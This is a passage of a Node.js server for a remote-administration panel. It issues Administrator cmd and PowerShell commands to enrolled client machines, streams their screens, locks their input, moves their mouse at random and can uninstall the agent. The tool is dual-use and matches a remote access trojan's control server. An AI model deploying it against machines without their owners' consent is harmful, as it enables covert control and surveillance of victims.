          color: #4ec9b0; padding: 0.5rem 0.5rem 0.5rem 1rem;
          font-size: 0.85rem; white-space: nowrap; user-select: none;
        }
        #cmd-input {
          flex: 1;
          background: transparent; border: none; color: #cccccc;
          padding: 0.5rem; font-family: inherit; font-size: 0.85rem;
          outline: none;
        }
        #cmd-input::placeholder { color: #555; }
      </style>
    </head>
    <body>
      <div class="header">
        <h1><span class="icon">terminal</span>` + consoleType.toUpperCase() + ` Console</h1>
        <span class="client-info">` + clientKey + `</span>
        <a href="/" class="back-link"><span class="icon">arrow_back</span>Dashboard</a>
      </div>
      <div id="terminal" class="terminal">
        <div class="info">Connected to ` + clientKey + ` | Type: ` + consoleType.toUpperCase() + `</div>
        <div class="info">Commands run as Administrator</div>
        <div class="info">---</div>
      </div>
      <div class="input-area">
        <span class="prompt">` + promptStr + `</span>
        <input id="cmd-input" type="text" placeholder="Enter command..." autofocus autocomplete="off">
      </div>
      <script>
        var CLIENT_KEY = "` + clientKey.replace(/\\/g, '\\\\').replace(/"/g, '\\"') + `";
        var CONSOLE_TYPE = "` + consoleType + `";
        var PROMPT_STR = "` + promptStr.replace(/\\/g, '\\\\').replace(/"/g, '\\"') + `";
        var terminal = document.getElementById('terminal');
        var input = document.getElementById('cmd-input');
        var cmdHistory = [];
        var historyIdx = -1;
        var busy = false;

        function appendToTerminal(html) {
          terminal.innerHTML += html;
          terminal.scrollTop = terminal.scrollHeight;
        }

        function sendConsoleCommand(command) {
          if (busy) return;
          busy = true;
          input.disabled = true;
          appendToTerminal('<div class="echo">' + PROMPT_STR.replace(/</g,'&lt;').replace(/>/g,'&gt;') + ' ' + command.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</div>');
          var action = CONSOLE_TYPE === 'powershell' ? 'exec_ps' : 'exec_cmd';
          fetch('/api/console/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ clientKey: CLIENT_KEY, action: action, command: command })
          }).then(function(r) { return r.json(); })
          .then(function(data) {
            if (data.error) {
              appendToTerminal('<div class="error">Error: ' + data.error + '</div>');
              busy = false;
              input.disabled = false;
              input.focus();
              return;
            }
            pollConsoleResult(data.taskId);
          }).catch(function(e) {
            appendToTerminal('<div class="error">Error: ' + e.message + '</div>');
            busy = false;
            input.disabled = false;
            input.focus();
          });
        }

        function pollConsoleResult(taskId) {
          var start = Date.now();
          var timeout = 65000;
          function poll() {
            fetch('/api/files/result/' + taskId)
              .then(function(r) { return r.json(); })
              .then(function(data) {
                if (data.status === 'done') {
                  var result = data.result;
                  if (result.error) {
                    appendToTerminal('<div class="error">' + result.error.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</div>');
                  } else if (result.output) {
                    var out = result.output.replace(/</g,'&lt;').replace(/>/g,'&gt;');
                    appendToTerminal('<div class="output">' + out + '</div>');
                  }
                  if (result.exitCode !== undefined) {
                    appendToTerminal('<div class="info">Exit code: ' + result.exitCode + '</div>');
                  }
                  busy = false;
                  input.disabled = false;
                  input.focus();
                  return;
                }
                if (Date.now() - start > timeout) {
                  appendToTerminal('<div class="error">Command timed out</div>');
                  busy = false;
                  input.disabled = false;
                  input.focus();
                  return;
                }
                setTimeout(poll, 800);
              }).catch(function() {
                if (Date.now() - start > timeout) {
                  appendToTerminal('<div class="error">Connection lost</div>');
                  busy = false;
                  input.disabled = false;
                  input.focus();
                } else {
                  setTimeout(poll, 800);
                }
              });
          }
          poll();
        }

        input.addEventListener('keydown', function(e) {
          if (e.key === 'Enter') {
            var cmd = input.value.trim();
            if (cmd) {
              cmdHistory.push(cmd);
              historyIdx = cmdHistory.length;
              if (cmd === 'clear' || cmd === 'cls') {
                terminal.innerHTML = '';
              } else {
                sendConsoleCommand(cmd);
              }
              input.value = '';
            }
          } else if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (historyIdx > 0) {
              historyIdx--;
              input.value = cmdHistory[historyIdx];
            }
          } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (historyIdx < cmdHistory.length - 1) {
              historyIdx++;
              input.value = cmdHistory[historyIdx];
            } else {
              historyIdx = cmdHistory.length;
              input.value = '';
            }
          }
        });

        terminal.addEventListener('click', function() {
          input.focus();
        });
      </script>
    </body>
    </html>
  `);
});

// ========== CONSOLE API ==========

app.post('/api/console/command', checkAuthApi, (req, res) => {
  const { clientKey, action, command } = req.body;
  if (!clientKey || !action || !command) {
    return res.status(400).json({ error: 'Missing clientKey, action, or command' });
  }
  const client = clients.get(clientKey);
  if (!client) {
    return res.status(404).json({ error: 'Client not found or offline' });
  }

  const taskId = 'task_' + (++taskCounter) + '_' + Date.now();
  const cmd = { action: action, taskId: taskId, command: command };

  pendingCommands.set(clientKey, cmd);

  setTimeout(() => {
    taskResults.delete(taskId);
  }, 120000);

  res.json({ taskId: taskId });
});

// ========== SCREENSHARE VIEWER ==========

app.get('/screenshare/:clientKey', checkAuth, (req, res) => {
  const clientKey = decodeURIComponent(req.params.clientKey);
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Screen Share - ` + clientKey + `</title>
      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
      <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
          background: #f8fafc; color: #1e293b;
          height: 100vh; display: flex; flex-direction: column;
        }
        .toolbar {
          display: flex; align-items: center; gap: 0.75rem; padding: 0.5rem 1rem;
          background: #ffffff; border-bottom: 1px solid #e2e8f0; flex-shrink: 0;
          flex-wrap: wrap;
        }
        .toolbar .title {
          font-weight: 600; font-size: 0.95rem; display: flex; align-items: center; gap: 0.4rem;
          color: #0f172a; margin-right: auto;
        }
        .toolbar select, .toolbar button {
          display: inline-flex; align-items: center; gap: 0.25rem;
          padding: 0.4rem 0.75rem; border-radius: 4px; font-size: 0.8rem; font-weight: 500;
          cursor: pointer; border: 1px solid #cbd5e1; background: #ffffff; color: #334155;
          width: auto;
        }
        .toolbar select:hover, .toolbar button:hover { background: #f1f5f9; }
        .toolbar button:disabled { opacity: 0.6; cursor: not-allowed; }
        .toolbar button.active-stream { background: #dcfce7; border-color: #86efac; color: #166534; }
        .toolbar button.active-lock { background: #fee2e2; border-color: #fecaca; color: #991b1b; }
        .icon { font-family: 'Material Symbols Outlined'; font-size: 1.1rem; }
        .viewer {
          flex: 1; display: flex; align-items: center; justify-content: center;
          background: #e2e8f0; position: relative; overflow: hidden;
        }
        .viewer img {
          max-width: 100%; max-height: 100%; object-fit: contain;
          image-rendering: auto;
        }
        .viewer .placeholder {
          color: #64748b; font-size: 1.5rem; text-align: center;
        }
        .viewer .placeholder .icon { font-size: 4rem; display: block; margin-bottom: 1rem; }
        .status-bar {
          display: flex; align-items: center; gap: 0.5rem; padding: 0.3rem 1rem;
          background: #ffffff; border-top: 1px solid #e2e8f0; font-size: 0.75rem;
          color: #64748b; flex-shrink: 0;
        }
        .status-dot {
          width: 6px; height: 6px; border-radius: 50%; background: #475569;
        }
        .status-dot.live { background: #22c55e; animation: pulse 1.5s infinite; }
        .status-dot.locked { background: #ef4444; }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
      </style>
    </head>
    <body>
      <div class="toolbar">
        <span class="title"><span class="icon">screenshot_monitor</span>Screen Share - ` + clientKey + `</span>
        <select id="monitor-select" onchange="onMonitorChange()"><option>Loading...</option></select>
        <button id="stream-btn" onclick="toggleStream()"><span class="icon">play_arrow</span>Start</button>
        <button id="lock-btn" onclick="toggleLock()"><span class="icon">lock_open</span>Lock Input</button>
        <button onclick="randomMouse(this)"><span class="icon">shuffle</span>Random Mouse</button>
        <a href="/" style="text-decoration:none;color:#64748b;font-size:0.8rem;display:flex;align-items:center;gap:0.25rem;"><span class="icon">arrow_back</span>Dashboard</a>
      </div>
      <div class="viewer" id="viewer">
        <div class="placeholder" id="placeholder">
          <span class="icon">desktop_windows</span>
          Click "Start" to begin streaming
        </div>
        <img id="screen-img" src="" alt="Screen" style="display:none">
      </div>
      <div class="status-bar">
        <span class="status-dot" id="status-dot"></span>
        <span id="status-text">Idle</span>
      </div>
      <script>
        var CLIENT_KEY = "` + clientKey.replace(/\\/g, '\\\\').replace(/"/g, '\\"') + `";
        var streaming = false;
        var inputLocked = false;
        var streamTimeout = null;
        var currentMonitor = null;
        var monitors = [];

        function setStatus(text, live) {
          document.getElementById('status-text').textContent = text;
          var dot = document.getElementById('status-dot');
          dot.className = 'status-dot';
          if (live) dot.classList.add('live');
          if (inputLocked) dot.classList.add('locked');
        }

        function sendCommand(action, params) {
          var body = { clientKey: CLIENT_KEY, action: action };
          for (var k in params) { body[k] = params[k]; }
          return fetch('/api/files/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
          }).then(function(r) { return r.json(); });
        }

        function pollResult(taskId, timeout) {
          var start = Date.now();
          timeout = timeout || 30000;
          return new Promise(function(resolve, reject) {
            function poll() {
              fetch('/api/files/result/' + taskId)
                .then(function(r) { return r.json(); })
                .then(function(data) {
                  if (data.status === 'done') { resolve(data.result); }
                  else if (Date.now() - start > timeout) { reject(new Error('Timeout')); }
                  else { setTimeout(poll, 400); }
                })
                .catch(function() {
                  if (Date.now() - start > timeout) reject(new Error('Timeout'));
                  else setTimeout(poll, 400);
                });
            }
            poll();
          });
        }

        function loadMonitors() {
          setStatus('Loading monitors...', false);
          sendCommand('list_monitors', {}).then(function(data) {
            return pollResult(data.taskId, 10000);
          }).then(function(result) {
            monitors = result.monitors || [];
            var sel = document.getElementById('monitor-select');
            sel.innerHTML = '';
            monitors.forEach(function(m) {
              var opt = document.createElement('option');
              opt.value = m.index;
              opt.textContent = 'Monitor ' + (m.index + 1) + (m.primary ? ' (Primary)' : '') + ' - ' + m.width + 'x' + m.height;
              if (m.primary) opt.selected = true;
              sel.appendChild(opt);
            });
            currentMonitor = monitors.length > 0 ? parseInt(sel.value) : 0;
            setStatus('Ready', false);
          }).catch(function(e) {
            setStatus('Error: ' + e.message, false);
          });
        }

        function onMonitorChange() {
          currentMonitor = parseInt(document.getElementById('monitor-select').value);
          if (streaming) {
            if (streamTimeout) { clearTimeout(streamTimeout); streamTimeout = null; }
            captureFrame();
          }
        }

        function captureFrame() {
          if (!streaming) return;
          sendCommand('screenshot', { monitor: currentMonitor }).then(function(data) {
            return pollResult(data.taskId, 15000);
          }).then(function(result) {
            if (!streaming) return;
            if (result.error) {
              setStatus('Error: ' + result.error, false);
            } else if (result.image) {
              var img = document.getElementById('screen-img');
              img.src = 'data:image/jpeg;base64,' + result.image;
              img.style.display = 'block';
              document.getElementById('placeholder').style.display = 'none';
              setStatus('Streaming Monitor ' + (currentMonitor + 1), true);
            }
            streamTimeout = setTimeout(captureFrame, 100);
          }).catch(function(e) {
            if (!streaming) return;
            setStatus('Capture error: ' + e.message, false);
            streamTimeout = setTimeout(captureFrame, 300);
          });
        }

        function toggleStream() {
          var btn = document.getElementById('stream-btn');
          if (streaming) {
            streaming = false;
            if (streamTimeout) { clearTimeout(streamTimeout); streamTimeout = null; }
            btn.innerHTML = '<span class="icon">play_arrow</span>Start';
            btn.classList.remove('active-stream');
            setStatus('Stopped', false);
          } else {
            streaming = true;
            btn.innerHTML = '<span class="icon">stop</span>Stop';
            btn.classList.add('active-stream');
            captureFrame();
          }
        }

        function toggleLock() {
          var btn = document.getElementById('lock-btn');
          btn.disabled = true;
          if (inputLocked) {
            sendCommand('block_input', { block: false }).then(function(data) {
              return pollResult(data.taskId, 8000);
            }).then(function(result) {
              btn.disabled = false;
              inputLocked = false;
              btn.innerHTML = '<span class="icon">lock_open</span>Lock Input';
              btn.classList.remove('active-lock');
              setStatus(streaming ? 'Streaming Monitor ' + (currentMonitor + 1) : 'Idle', streaming);
            }).catch(function() {
              btn.disabled = false;
            });
          } else {
            sendCommand('block_input', { block: true }).then(function(data) {
              return pollResult(data.taskId, 8000);
            }).then(function(result) {
              btn.disabled = false;
              inputLocked = true;
              btn.innerHTML = '<span class="icon">lock</span>Unlock Input';
              btn.classList.add('active-lock');
              setStatus('Input locked', false);
            }).catch(function() {
              btn.disabled = false;
            });
          }
        }

        function randomMouse(btn) {
          if (btn) btn.disabled = true;
          sendCommand('mouse_random', {}).then(function(data) {
            return pollResult(data.taskId, 8000);
          }).then(function(result) {
            if (btn) btn.disabled = false;
            if (result.x !== undefined) {
              setStatus('Mouse jumped to ' + result.x + ',' + result.y, false);
            }
          }).catch(function() {
            if (btn) btn.disabled = false;
          });
        }

        function unlockOnClose() {
          if (inputLocked) {
            fetch('/api/screenshare/unlock', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ clientKey: CLIENT_KEY }),
              keepalive: true
            });
          }
        }

        window.addEventListener('beforeunload', unlockOnClose);
        window.addEventListener('pagehide', unlockOnClose);

        loadMonitors();
      </script>
    </body>
    </html>
  `);
});

// ========== SCREENSHARE UNLOCK API ==========

app.post('/api/screenshare/unlock', checkAuthApi, (req, res) => {
  const { clientKey } = req.body;
  if (!clientKey) return res.status(400).json({ error: 'Missing clientKey' });
  const client = clients.get(clientKey);
  if (!client) return res.status(404).json({ error: 'Client not found' });
  const taskId = 'task_' + (++taskCounter) + '_' + Date.now();
  pendingCommands.set(clientKey, { action: 'block_input', taskId: taskId, block: false });
  res.json({ success: true });
});

// ========== HEARTBEAT ==========

app.post('/api/heartbeat', authenticateClient, (req, res) => {
  const reqBody = req.body || {};
  const { username, mac } = reqBody;
  if (!username) {
    return res.status(400).send('Missing username');
  }
  let ip = req.ip || req.socket.remoteAddress;
  if (ip.startsWith('::ffff:')) {
    ip = ip.substring(7);
  }
  const clientMac = (mac && mac !== 'UNKNOWN_MAC') ? mac : ip;
  const key = `${clientMac}/${username}`;
  
  if (blockedClients.has(key)) {
    const shouldDeleteFile = blockedClients.get(key);
    blockedClients.delete(key);
    return res.json({ action: 'uninstall', deleteFile: shouldDeleteFile, taskId: 'uninstall_blocked_' + Date.now() });
  }

  clients.set(key, {
    name: key,
    ip: ip,
    mac: clientMac,
    lastSeen: Date.now()
  });

  if (pendingCommands.has(key)) {
    const cmd = pendingCommands.get(key);
    pendingCommands.delete(key);
    res.json(cmd);
  } else {
    res.sendStatus(200);
  }
});

// ========== CLIENT LIST ==========

app.get('/api/clients', checkAuthApi, (req, res) => {
  const list = [];
  const now = Date.now();
  for (const [key, val] of clients.entries()) {
    const isActive = now - val.lastSeen < 10000;
    list.push({
      name: val.name,
      ip: val.ip,
      active: isActive,
      lastSeen: val.lastSeen
    });
  }
  res.json(list);
});

// Persistent or memory-based blocklist for uninstalled clients: key -> deleteFile (boolean)
const blockedClients = new Map();

// ========== REMOVE CLIENT ==========

app.post('/api/remove', checkAuthApi, (req, res) => {
  const { key, deleteFile } = req.body;
  if (!key) {
    return res.status(400).json({ error: 'Missing key' });
  }
  const client = clients.get(key);
  if (!client) {
    return res.status(404).json({ error: 'Client not found' });
  }
  const isActive = Date.now() - client.lastSeen < 10000;
  
  const shouldDelete = deleteFile === true || deleteFile === "true";

  // Add to blocklist with the exact user preference for deleteFile
  blockedClients.set(key, shouldDelete);

  if (isActive) {
    pendingCommands.set(key, { action: 'uninstall', deleteFile: shouldDelete });
    setTimeout(() => {
      clients.delete(key);
      pendingCommands.delete(key);
    }, 15000);
  } else {
    clients.delete(key);
  }
  res.json({ success: true, wasActive: isActive });
});

// ========== FILE OPERATIONS ==========

let taskCounter = 0;

app.post('/api/files/command', checkAuthApi, (req, res) => {
  const { clientKey, action } = req.body;
  if (!clientKey || !action) {
    return res.status(400).json({ error: 'Missing clientKey or action' });
  }
  const client = clients.get(clientKey);
  if (!client) {
    return res.status(404).json({ error: 'Client not found' });
  }

  const taskId = 'task_' + (++taskCounter) + '_' + Date.now();
  const cmd = Object.assign({ taskId: taskId }, req.body);
  delete cmd.clientKey;

  pendingCommands.set(clientKey, cmd);

  // Clean up old task result after 2 minutes
  setTimeout(() => {
    taskResults.delete(taskId);
  }, 120000);

  res.json({ taskId: taskId });
});

app.post('/api/task-result', authenticateClient, (req, res) => {
  const reqBody = req.body || {};
  const { username, taskId, result } = reqBody;
  if (!taskId || !result) {
    return res.status(400).json({ error: 'Missing fields' });
  }
  taskResults.set(taskId, { status: 'done', result: result, time: Date.now() });
  res.sendStatus(200);
});

app.get('/api/files/result/:taskId', checkAuthApi, (req, res) => {
  const taskId = req.params.taskId;
  const result = taskResults.get(taskId);
  if (!result) {
    return res.json({ status: 'pending' });
  }
  res.json(result);
});

// ========== START ==========

app.listen(PORT, () => {
  console.log(`Server started on port ${PORT}`);
});
